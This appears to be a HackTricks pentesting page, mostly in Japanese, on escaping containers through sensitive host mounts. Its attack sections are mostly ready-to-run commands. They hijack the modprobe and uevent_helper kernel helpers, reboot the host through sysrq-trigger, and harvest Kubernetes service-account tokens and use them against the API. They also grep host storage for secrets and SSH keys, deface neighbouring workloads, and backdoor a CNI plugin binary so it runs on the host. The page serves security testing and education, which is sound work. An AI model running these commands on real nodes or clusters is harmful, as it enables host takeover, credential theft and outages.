# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## 概要

Host mounts は、実用上もっとも重要な container-escape 面の1つです。なぜなら、慎重に分離された process view を host resources への直接的な可視性へと崩してしまうことが多いからです。危険なケースは `/` だけではありません。`/proc`、`/sys`、`/var`、runtime sockets、kubelet-managed state、device 関連パスの bind mounts は、kernel controls、credentials、隣接する container filesystems、runtime management interfaces を露出させる可能性があります。

このページが個別の protection ページとは別になっているのは、悪用モデルが横断的だからです。writable な host mount が危険なのは、mount namespaces のためでもあり、user namespaces のためでもあり、AppArmor や SELinux の coverage のためでもあり、そして具体的にどの host path が露出したかのためでもあります。これを独立したトピックとして扱うことで、attack surface をはるかに把握しやすくなります。

## `/proc` Exposure

procfs には、通常の process 情報と、高影響な kernel control interfaces の両方が含まれます。そのため、`-v /proc:/host/proc` のような bind mount や、予期しない writable proc entries を公開する container view は、情報漏えい、denial of service、あるいは host での直接的な code execution につながる可能性があります。

高価値な procfs paths には次が含まれます:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

まず、どの高価値 procfs entries が見えているか、または書き込み可能かを確認します:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
これらのパスは、さまざまな理由で興味深いです。`core_pattern`、`modprobe`、`binfmt_misc` は、書き込み可能であれば host code-execution path になり得ます。`kallsyms`、`kmsg`、`kcore`、`config.gz` は、kernel exploitation のための強力な reconnaissance source です。`sched_debug` と `mountinfo` は、container 内から host のレイアウトを再構築するのに役立つ process、cgroup、filesystem の context を明らかにします。

各 path の実用的な価値は異なり、それらをすべて同じ impact を持つかのように扱うと triage が難しくなります:

- `/proc/sys/kernel/core_pattern`
書き込み可能であれば、これは最も impact の大きい procfs path の1つです。なぜなら kernel は crash 後に pipe handler を実行するからです。container が `core_pattern` を overlay 上または mounted host path 上に保存された payload に向けられるなら、しばしば host code execution を得られます。専用の例として [read-only-paths.md](protections/read-only-paths.md) も参照してください。
- `/proc/sys/kernel/modprobe`
この path は、kernel が module-loading logic を呼び出す必要があるときに使う userspace helper を制御します。container から書き込み可能で、host context で解釈される場合、別の host code execution primitive になり得ます。helper path を trigger する方法と組み合わせたときに特に興味深いです。
- `/proc/sys/vm/panic_on_oom`
これは通常、きれいな escape primitive ではありませんが、OOM condition を kernel panic behavior に変えることで、メモリ圧迫を host-wide な denial of service に変えられます。
- `/proc/sys/fs/binfmt_misc`
registration interface が書き込み可能であれば、攻撃者は選択した magic value に対する handler を登録し、一致する file が実行されたときに host-context execution を得られる可能性があります。
- `/proc/config.gz`
kernel exploit triage に有用です。host package metadata を必要とせずに、どの subsystems、mitigations、optional kernel features が有効かを判断するのに役立ちます。
- `/proc/sysrq-trigger`
主に denial-of-service path ですが、非常に深刻です。host を即座に reboot、panic、またはその他の方法で disrupt できます。
- `/proc/kmsg`
kernel ring buffer messages を明らかにします。host fingerprinting、crash analysis、そして一部の環境では kernel exploitation に役立つ情報の leak に有用です。
- `/proc/kallsyms`
読み取り可能であれば価値があります。exported kernel symbol information を公開し、kernel exploit development 中に address randomization の前提を破るのに役立つ可能性があります。
- `/proc/[pid]/mem`
これは直接的な process-memory interface です。target process に必要な ptrace-style conditions で到達できる場合、別の process の memory を読み取る、または変更することを許す可能性があります。現実的な impact は credentials、`hidepid`、Yama、ptrace restrictions に大きく依存するため、強力ですが条件付きの path です。
- `/proc/kcore`
system memory の core-image-style な view を公開します。file は巨大で扱いにくいですが、意味のある形で読み取れるなら host memory surface がひどく露出していることを示します。
- `/proc/kmem` and `/proc/mem`
歴史的に impact の大きい raw memory interface です。多くの modern system では無効化または強く制限されていますが、存在して使用可能なら critical finding として扱うべきです。
- `/proc/sched_debug`
scheduling と task information を漏えいし、他の process view が予想以上にきれいに見える場合でも host process identities を露出する可能性があります。
- `/proc/[pid]/mountinfo`
container が host 上で実際にどこに存在するのか、どの paths が overlay-backed なのか、そして writable mount が host content に対応するのか、それとも container layer のみに対応するのかを再構成するのに非常に有用です。

`/proc/[pid]/mountinfo` または overlay details が読み取れる場合、それらを使って container filesystem の host path を復元してください:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
これらのコマンドは、コンテナ内のパスをホスト側の視点で対応するパスに変換する必要がある host-execution のトリックがいくつかあるため、役に立ちます。

### Full Example: `modprobe` Helper Path Abuse

`/proc/sys/kernel/modprobe` がコンテナから書き込み可能で、かつ helper path がホストのコンテキストで解釈される場合、攻撃者が制御する payload にリダイレクトできます:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
正確なトリガーは target と kernel の挙動に依存するが、重要なのは、書き込み可能な helper path が、将来の kernel helper 呼び出しを attacker-controlled な host-path content にリダイレクトできるという点である。

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

目的が immediate escape ではなく exploitability assessment である場合:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
これらのコマンドは、有用なシンボル情報が見えているか、最近の kernel メッセージが興味深い状態を明らかにしているか、どの kernel 機能や mitigation が組み込まれているかを把握するのに役立ちます。影響は通常、直接的な escape ではありませんが、kernel-vulnerability のトリアージを大幅に短縮できます。

### Full Example: SysRq Host Reboot

If `/proc/sysrq-trigger` is writable and reaches the host view:
```bash
echo b > /proc/sysrq-trigger
```
効果は即座にホスト再起動です。これは控えめな例ではありませんが、procfs exposure が単なる情報漏えいよりはるかに深刻になり得ることを明確に示しています。

## `/sys` Exposure

sysfs は大量の kernel と device の状態を公開します。いくつかの sysfs path は主に fingerprinting に役立ちますが、他のものは helper execution、device behavior、security-module configuration、または firmware state に影響を与えることがあります。

高価値な sysfs path には次が含まれます:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

これらの path が重要なのは、それぞれ異なる理由があるためです。`/sys/class/thermal` は thermal-management の挙動に影響し、露出の悪い環境ではホストの安定性に関わる可能性があります。`/sys/kernel/vmcoreinfo` は crash-dump と kernel-layout の情報を leak し、低レベルのホスト fingerprinting に役立ちます。`/sys/kernel/security` は Linux Security Modules が使用する `securityfs` interface であり、ここへの予期しない access は MAC 関連の state を露出または変更する可能性があります。EFI variable path は firmware-backed boot settings に影響を与え、通常の configuration files よりはるかに深刻です。`/sys/kernel/debug` 配下の `debugfs` は特に危険です。なぜなら、これは意図的に developer 向け interface であり、hardening された production-facing kernel APIs よりも安全性の期待がはるかに低いからです。

これらの path を確認するのに役立つ review commands は次のとおりです:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
それらのコマンドが興味深い理由:

- `/sys/kernel/security` は、AppArmor、SELinux、または別の LSM surface が、本来は host-only であるべき形で見えているかどうかを示す可能性がある。
- `/sys/kernel/debug` は、このグループの中で最も警戒すべき発見であることが多い。`debugfs` が mount されていて読み取りまたは書き込み可能なら、有効になっている debug nodes によって正確なリスクが変わる広い kernel-facing surface を想定する。
- EFI variable の露出はそれほど一般的ではないが、存在する場合は高い影響がある。なぜなら、通常の runtime files ではなく firmware-backed settings に触れるからである。
- `/sys/class/thermal` は主に host の安定性と hardware interaction に関係し、きれいな shell-style escape にはあまり関係しない。
- `/sys/kernel/vmcoreinfo` は主に host fingerprinting と crash-analysis のソースであり、低レベルの kernel state を理解するのに役立つ。

### Full Example: `uevent_helper`

もし `/sys/kernel/uevent_helper` が writable なら、kernel は `uevent` が trigger されたときに attacker-controlled helper を execute する可能性がある:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
この仕組みが機能する理由は、helper path が host の視点から解釈されるためです。一度トリガーされると、helper は現在の container の内側ではなく host context で実行されます。

## `/var` Exposure

host の `/var` を container に mount するのは、`/` を mount するほど劇的に見えないため、しばしば過小評価されます。実際には、runtime sockets、container snapshot directories、kubelet-managed pod volumes、projected service-account tokens、隣接する application filesystems に到達できるだけで十分なことがあります。modern nodes では、`/var` は実際に最も operationally interesting な container state が存在する場所であることが多いです。

### Kubernetes Example

`hostPath: /var` を持つ pod は、他の pod の projected tokens や overlay snapshot content を読めることがよくあります:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
これらのコマンドは、マウントが単なるアプリケーションデータだけを公開しているのか、それとも影響の大きい cluster credentials を公開しているのかを判別できるため有用です。読み取り可能な service-account token があれば、local code execution がただちに Kubernetes API access へ変わることがあります。

token が存在する場合は、token の発見で止まらず、何に到達できるかを確認してください:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
ここでの影響は、ローカルな node access だけにとどまらない可能性がある。広範な RBAC を持つ token は、マウントされた `/var` を cluster-wide compromise に変えうる。

### Docker And containerd Example

Docker hosts では、関連データはしばしば `/var/lib/docker` 配下にあり、containerd-backed の Kubernetes nodes では `/var/lib/containerd` や snapshotter-specific paths 配下にある場合がある:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
マウントされた `/var` が別の workload の書き込み可能な snapshot contents を露出している場合、攻撃者は current container configuration に触れずに、application files を改ざんしたり、web content を配置したり、startup scripts を変更したりできる可能性があります。

書き込み可能な snapshot content が見つかった後の具体的な abuse ideas:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
これらのコマンドは、マウントされた `/var` の3つの主要な影響カテゴリ、つまり application tampering、secret recovery、そして neighboring workloads への lateral movement を示すため、役立ちます。

## Kubelet State, Plugins, And CNI Paths

`/var/lib/kubelet`、`/opt/cni/bin`、または `/etc/cni/net.d` の mount は、privileged DaemonSets、CNI agents、CSI node plugins、GPU operators、そして storage helpers を通じて公開されることがよくあります。これらの mount は "node plumbing" として見過ごされがちですが、新しい pods の execution path に直接位置しており、kubelet credentials、projected secrets、registration sockets、そして実行可能な host-side plugin binaries を含んでいることがよくあります。

High-value targets には以下が含まれます:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Useful review commands are:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Why these paths matter:

- `/var/lib/kubelet/pki` may expose kubelet client certificates and other node-local credentials that can sometimes be reused against the API server or kubelet-facing TLS endpoints, depending on cluster design.
- `/var/lib/kubelet/pods` often contains projected service-account tokens and mounted Secrets for neighboring pods on the same node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` is mainly a reconnaissance surface, but a very useful one: it reveals which pods and containers currently own GPUs, hugepages, SR-IOV devices, and other scarce node-local resources.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, and `/var/lib/kubelet/plugins_registry` reveal which CSI, DRA, and device plugins are installed and which sockets the kubelet is expected to talk to. If those directories are writable rather than merely readable, the finding becomes much more serious.
- `/opt/cni/bin` and `/etc/cni/net.d` sit directly on the pod-network setup path. Writable access there is often a delayed host-execution primitive rather than just configuration exposure.

### Full Example: Writable `/opt/cni/bin`

If a host CNI binary directory is mounted read-write, replacing a plugin can be enough to obtain host execution the next time the kubelet creates a pod sandbox on that node:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
これは mounted された `docker.sock` ほど即時ではありませんが、侵害された Kubernetes infrastructure pods では、こちらの方がより現実的なことがよくあります。重要なのは、改変された binary は現在の container ではなく、その後に host network setup flow によって実行されるという点です。


## Runtime Sockets

Sensitive host mounts には、完全な directories ではなく runtime sockets が含まれることがよくあります。これらは非常に重要なので、ここで明示的に繰り返しておく価値があります:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
[socket] がマウントされると、完全な exploitation フローについては [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) を参照してください。

簡単な最初の interaction pattern として:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
1つでも成功すれば、"mounted socket" から "start a more privileged sibling container" までの経路は、通常、どんな kernel breakout path よりもはるかに短くなります。

## Mount-Related CVEs

Host mounts は runtime の脆弱性とも重なります。重要な最近の例には次があります。

- `CVE-2024-21626` in `runc` では、漏れた directory file descriptor により working directory を host filesystem 上に置けてしまう可能性があります。
- `CVE-2024-23651`、`CVE-2024-23652`、および `CVE-2024-23653` in BuildKit では、悪意ある Dockerfiles、frontends、`RUN --mount` のフローにより、build 中に host file access、削除、または elevated privileges を再導入できてしまう可能性があります。
- `CVE-2024-1753` in Buildah と Podman build flows では、build 中に細工した bind mounts により `/` を read-write で露出させられる可能性があります。
- `CVE-2025-47290` in `containerd` 2.1.0 では、image unpack 中の TOCTOU により、特別に細工した image が pull 中に host filesystem を変更できてしまう可能性があります。

これらの CVEs がここで重要なのは、mount handling が operator configuration だけの問題ではないことを示しているからです。runtime 自体も mount-driven escape conditions を持ち込む可能性があります。

## Checks

最も価値の高い mount exposures を素早く見つけるには、次のコマンドを使ってください:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
ここで注目すべき点:

- Host root、`/proc`、`/sys`、`/var`、および runtime sockets は、いずれも優先度の高い発見事項です。
- 書き込み可能な proc/sys エントリは、多くの場合、その mount が安全な container view ではなく host-global な kernel controls を公開していることを意味します。
- mount された `/var` パスは、filesystem の確認だけでなく、credential と neighboring-workload の確認も必要です。
- Kubelet state directories と CNI/plugin パスは、runtime sockets と同じ優先度で扱うべきです。なぜなら、それらは多くの場合、node の pod-creation と credential-distribution の経路に直接載っているからです。

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
